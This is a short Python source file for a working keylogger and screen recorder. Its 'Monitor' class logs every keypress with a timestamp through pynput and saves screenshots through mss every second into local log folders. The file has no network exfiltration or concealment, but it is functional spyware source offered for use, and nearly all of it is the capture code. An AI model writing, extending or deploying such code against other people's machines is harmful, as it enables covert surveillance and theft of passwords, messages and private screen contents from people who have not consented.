# Either make log/keylogs and logs/screens directory or do not make any log directory


from pynput.keyboard import Listener
from mss import mss
from threading import Timer, Thread
import datetime
import os


class IntervalTimer(Timer):
    
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:

    def _on_press(self, k):             # Writes the key presses whenever a key is pressed
        time = datetime.datetime.now()
        with open("./logs/keylogs/key_logs.txt", "a") as log:
            log.write(f"{time.date()} {time.time()}    |   {k}\n")
    
    def _destination(self):             # Make directories
        if not os.path.exists("./logs"):
            os.mkdir("./logs")
            os.mkdir("./logs/keylogs/")
            os.mkdir("./logs/screens/")
    
    def _keylogger(self):             # Log the keypresses
        with Listener(on_press=self._on_press) as listener:
            listener.join()
    
    def _screenshot(self):            # Take the screenshot
        time = datetime.datetime.now()
        sct = mss()
        sct.shot(output=f"./logs/screens/SCR_{time.date()}_{time.time()}")

    def run(self, interval=1):        # "Amount of time in seconds that occurs between logs"
        # Run the screenshot taker in keylogger parallel.

        self._destination()         # Making the folders if they are not present
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()

 
if __name__ == "__main__":
    man = Monitor()
    man.run()